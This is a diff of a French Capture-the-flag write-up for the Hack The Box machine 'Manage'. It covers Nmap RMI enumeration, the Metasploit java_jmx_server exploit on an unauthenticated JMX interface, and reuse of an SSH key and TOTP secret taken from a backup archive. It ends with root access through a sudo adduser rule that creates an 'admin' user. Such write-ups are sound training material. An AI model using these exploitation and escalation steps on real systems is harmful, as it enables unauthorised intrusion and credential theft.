@@ -1,5 +1,6 @@
 ---
 
+
 # === Archetype: writeups (Page Bundle) ===
 # Copié vers content/writeups/<nom_ctf>/index.md
 
@@ -145,41 +146,15 @@ Ce scan confirme :
 
 - **Tomcat 10.1.19** sur le port **8080/tcp**
 - Deux services **Java RMI** sur **2222/tcp** et **45931/tcp** 
-- Aucun script Nmap “http-vuln-*” ne remonte de vulnérabilité web évidente sur Tomcat
+- Aucun script Nmap “http-vuln-*” ne remonte de vulnérabilité web évidente
 
-Un scan complémentaire NMAP NSE orienté **rmi** va nous donner plus d'infos
+**Le script NSE arrive à interroger le registre RMI**. S’il répond, c’est qu’il n’exige **ni authentification**, ni **politique de sécurité**, ni **filtrage IP**.
 
-```bash
-nmap -sV --script rmi* -p 2222 -oN mes_scans/rmi_scan.txt manage.htb
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 11:03 CET
-Nmap scan report for manage.htb (10.129.234.57)
-Host is up (0.0079s latency).
-
-PORT     STATE SERVICE  VERSION
-2222/tcp open  java-rmi Java RMI
-| rmi-dumpregistry: 
-|   jmxrmi
-|     javax.management.remote.rmi.RMIServerImpl_Stub
-|     @127.0.1.1:42277
-|     extends
-|       java.rmi.server.RemoteStub
-|       extends
-|_        java.rmi.server.RemoteObject
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
-
-```
-
-**Le script NSE arrive à interroger le registre RMI**
- → S’il répond, c’est qu’il n’exige **ni authentification**, ni **politique de sécurité**, ni **filtrage IP**.
-
-Dès que **jmxrmi apparaît**, tu sais que :
+Dès que **jmxrmi apparaît**, on sait que :
 
 - il existe une interface **JMX Remote**,
 - elle n’est pas protégée,
-- elle est probablement exploitable via `java_jmx_server` (Metasploit) ou `JMXInvokerServlet` selon la version.
-
+- elle est probablement exploitable via `java_jmx_server` (Metasploit) .
 ### Scan ciblé CMS
 
 Le scan ciblé CMS (`mes_scans/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
@@ -251,7 +226,7 @@ En approfondissant sur `/docs` et `/examples` (nouveaux `mon-recoweb` ciblés), 
 
 ### Scan vhosts
 
-Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-recoweb" >}} :
+Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}} :
 
 ```bash
 === mon-subdomains manage.htb START ===
@@ -292,7 +267,7 @@ Je recentre donc  l’analyse sur :
 - **Tomcat /manager** (403 mais important conceptuellement)
 - et surtout la **présence des deux services Java RMI**, qui serviront de point d’entrée pour l’exploitation ultérieure.
 
-Pour confirmer la piste JMX, j’ai lancé un scan Nmap ciblé sur le port RMI détecté au scan agressif. Le script NSE `rmi*` permet d’interroger un registre RMI et révèle souvent la présence d’une interface JMX exposée. 
+Un scan complémentaire NMAP NSE orienté **rmi** va nous donner plus d'infos
 
 ```bash
 nmap --script "rmi*" -sV -p 2222 manage.htb
@@ -316,7 +291,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
 
 ```
 
-Sur cette machine, le script a clairement montré que le serveur RMI acceptait les connexions distantes sans authentification, ce qui n’est normalement pas autorisé. L’entrée `jmxrmi` était accessible, signe d’une configuration Tomcat vulnérable. Une interface JMX ouverte ainsi vers l’extérieur équivaut à une exécution de code à distance. 
+Sur cette machine, le script montre clairement que le serveur RMI accepte des connexions distantes sans authentification. L’entrée `jmxrmi` est accessible, signe d’une configuration Tomcat vulnérable. Une interface JMX ouverte ainsi vers l’extérieur équivaut à une exécution de code à distance. 
 
 Une recherche Web sur "Metasploit modules Java RMI JMX" va livrer:
 
@@ -325,42 +300,16 @@ Une recherche Web sur "Metasploit modules Java RMI JMX" va livrer:
   - Description : Ce module tire parti d'une configuration non sécurisée de l'interface JMX, permettant de charger des classes depuis une URL HTTP distante. Il est efficace contre les interfaces JMX sans authentification ou avec une configuration faible (par exemple, si `com.sun.management.jmxremote.authenticate=false`).
   - Source : <a href="https://blog.pentesteracademy.com/java-jmx-server-insecure-configuration-java-code-execution-295421a452f7" target="_blank" rel="noopener noreferrer">Pentester Academy</a>
 
-Cette confirmation va me permettre de tester le module Metasploit `java_jmx_server` qui devrait me fournir un shell `tomcat`. 
+Cette confirmation va me permettre de tester le module Metasploit `java_jmx_server` qui devrait me fournir un shell `meterpreter`. 
 
 
-
-```bash
-# Step 1: Start Metasploit
-msfconsole
-
-# Step 2: Search for the exploit
-search java_jmx_server
-
-# Step 3: Use the JMX RMI exploit
-use exploit/multi/misc/java_jmx_server
-
-# Step 4: Set the target host
-set RHOST <machine IP>
-
-# Step 5: Set the RMI port
-set RPORT 2222
-
-# Step 6: Set your local IP (replace with your actual tun0 IP)
-set LHOST <your_tun0 IP>
-
-# Step 7: Set the local port to receive the shell
-set LPORT 1337
-
-# Step 8: Launch the exploit
-exploit
-```
 
 ### Metasploit
 
 - Exploit
 
 ```bash
-> msfconsole               
+msfconsole               
 Metasploit tip: Use check before run to confirm if a target is 
 vulnerable
                                                   
@@ -591,14 +540,12 @@ meterpreter >
 ### Exploitation de backup.tar.gz dans kali linux
 
 ```bash
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ ls -l
+ls -l
 total 4
 -rw-r--r-- 1 kali kali 3088 Jun 21  2024 backup.tar.gz
 drwxr-xr-x 2 kali kali    0 Nov 19 16:17 mes_scans
                                                                                                                        
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ tar -xvzf backup.tar.gz
+tar -xvzf backup.tar.gz
 ./
 ./.bash_logout
 ./.profile
@@ -614,8 +561,7 @@ drwxr-xr-x 2 kali kali    0 Nov 19 16:17 mes_scans
 tar: ./.bash_history: Cannot create symlink to ‘/dev/null’: Operation not supported
 tar: Exiting with failure status due to previous errors
                                                                                                                        
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ ls -la
+ ls -la
 total 20
 drwxr-xr-x 2 kali kali    0 Jun 21  2024 .
 drwxr-xr-x 2 kali kali    0 Nov 17 16:57 ..
@@ -627,16 +573,13 @@ drwxr-xr-x 2 kali kali    0 Jun 21  2024 .cache
 drwxr-xr-x 2 kali kali    0 Nov 19 16:17 mes_scans
 -rw-r--r-- 1 kali kali  807 Jun 21  2024 .profile
 drwxr-xr-x 2 kali kali    0 Jun 21  2024 .ssh
-                                                                                                                       
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ 
+                                                                                       
 ```
 
 - explorons le contenu de  .google_authenticator
 
 ```bash
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ cat .google_authenticator                   
+cat .google_authenticator                   
 CLSSSMHYGLENX5HAIFBQ6L35UM
 " RATE_LIMIT 3 30 1718988529
 " WINDOW_SIZE 3
@@ -652,25 +595,20 @@ CLSSSMHYGLENX5HAIFBQ6L35UM
 69267218
 76839253
 56800775
-                                                                                                                       
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ 
+                                                                                       
 ```
 
 - le répertoire .ssh contient **une copie des clés de l'utilisateur useradmin**
 
 ```bash
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ ls -la .ssh                                    
+ls -la .ssh                                    
 total 12
 drwxr-xr-x 2 kali kali   0 Jun 21  2024 .
 drwxr-xr-x 2 kali kali   0 Jun 21  2024 ..
 -rw-r--r-- 1 kali kali  98 Jun 21  2024 authorized_keys
 -rw-r--r-- 1 kali kali 411 Jun 21  2024 id_ed25519
 -rw-r--r-- 1 kali kali  98 Jun 21  2024 id_ed25519.pub
-                                                                                                                       
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/manage]
-└─$ 
+
 ```
 
 
@@ -678,6 +616,8 @@ drwxr-xr-x 2 kali kali   0 Jun 21  2024 ..
 ---
 
 ## Escalade de privilèges
+
+- connexion à manage.htb
 
 ```bash
 cp .ssh/id* /home/kali/tmp/ 
@@ -687,72 +627,54 @@ chmod 600 id_ed25519
 
 ssh -i id_ed25519 useradmin@manage.htb
 
-useradmin@manage:~$ getent group | cut -d: -f1 | sort
-adm
-audio
-backup
-bin
-cdrom
-crontab
-daemon
-dialout
-dip
-disk
-fax
-floppy
-fwupd-refresh
-games
-gnats
-input
-irc
-karl
-kmem
-kvm
-landscape
-_laurel
-list
-lp
-lxd
-mail
-man
-messagebus
-netdev
-news
-nogroup
-operator
-plugdev
-proxy
-render
-root
-sasl
-sgx
-shadow
-src
-_ssh
-staff
-sudo
-sys
-syslog
-systemd-journal
-systemd-network
-systemd-resolve
-systemd-timesync
-tape
-tcpdump
-tomcat
-tss
-tty
-useradmin
-users
-utmp
-uucp
-uuidd
-video
-voice
-www-data
+cp: cannot stat '.ssh/id*': No such file or directory
+(useradmin@manage.htb) Verification code:
+```
+
+- pour le `Verification code` j'utilise un des codes de `.google_authenticator` par exemple le premier `99852083`
+
+```bash
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Nov 21 09:39:17 AM UTC 2025
+
+  System load:           0.0
+  Usage of /:            73.8% of 4.34GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             212
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.35.198
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:6cac
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
 
 
-useradmin@manage:~$ sudo -l
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+useradmin@manage:~$
+```
+
+- nous voilà connecté à manage.htb
+- commençons par le classique `sudo -l`
+
+```bash
+sudo -l
 Matching Defaults entries for useradmin on manage:
     env_reset, timestamp_timeout=1440, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
@@ -761,6 +683,16 @@ Matching Defaults entries for useradmin on manage:
 User useradmin may run the following commands on manage:
     (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
     
+```
+
+- La règle sudo **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$** autorise useradmin à lancer `adduser` **sans mot de passe**, mais uniquement avec un argument composé de caractères alphanumériques.
+- Cette restriction empêche d’ajouter directement un utilisateur à un groupe privilégié (ex. `sudo`, `adm`, etc.) puisqu’on ne peut pas passer d’options
+- Lorsqu’on crée un utilisateur `admin`, Ubuntu crée automatiquement **un groupe du même nom** : `admin`.
+- **Historiquement**, dans Ubuntu, le groupe `admin` appartient aux *sudoers* et possède des droits équivalents à `sudo` (héritage des anciennes versions où `admin` = super-user local).
+- **Résultat : l’utilisateur `admin` nouvellement créé peut exécuter `sudo -i` et obtenir un shell root immédiatement.**
+
+```bash
+
 useradmin@manage:~$ sudo adduser admin
 Adding user `admin' ...
 Adding new group `admin' (1003) ...
@@ -791,26 +723,11 @@ total 8
 -rw-r----- 1 root root   33 Apr 14  2025 root.txt
 drwx------ 3 root root 4096 Mar  1  2024 snap
 root@manage:~#
+root@manage:~# cat root.txt
+b364xxxxxxxxxxxxxxxxxxxxxxxxdc34
 ```
 
 
-
-La règle sudo
- **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$**
- autorise useradmin à lancer `adduser` **sans mot de passe**, mais uniquement avec un argument composé de caractères alphanumériques.
-
-Cette restriction empêche d'ajouter directement un utilisateur à un groupe privilégié (ex. `sudo`, `adm`, etc.) puisqu’on ne peut pas passer d’options comme `--ingroup sudo`. Cependant, créer l’utilisateur **admin** provoque automatiquement la création du **groupe admin**, qui possède historiquement des privilèges élevés sur Ubuntu — ce qui permet ensuite d’obtenir root.
-
-
-
-Sur Ubuntu, même si ce n’est plus le cas dans les versions modernes, **le groupe `admin` reste historiquement associé aux droits sudo complets** via `/etc/sudoers` ou une règle héritée (compatibilité Debian).
-
-**Créer l’utilisateur `admin` lui donne immédiatement des droits root**, car :
-
-- La commande autorisée par sudo (`sudo adduser ^[a-zA-Z0-9]+$`) permet de créer n’importe quel utilisateur sans mot de passe.
-- Lorsqu’on crée un utilisateur `admin`, Ubuntu crée automatiquement **un groupe du même nom** : `admin`.
-- **Historiquement**, dans Ubuntu, le groupe `admin` appartient aux *sudoers* et possède des droits équivalents à `sudo` (héritage des anciennes versions où `admin` = super-user local).
-- Résultat : l’utilisateur `admin` nouvellement créé peut exécuter `sudo -i` et **obtenir un shell root immédiatement**.
 
 ---
 
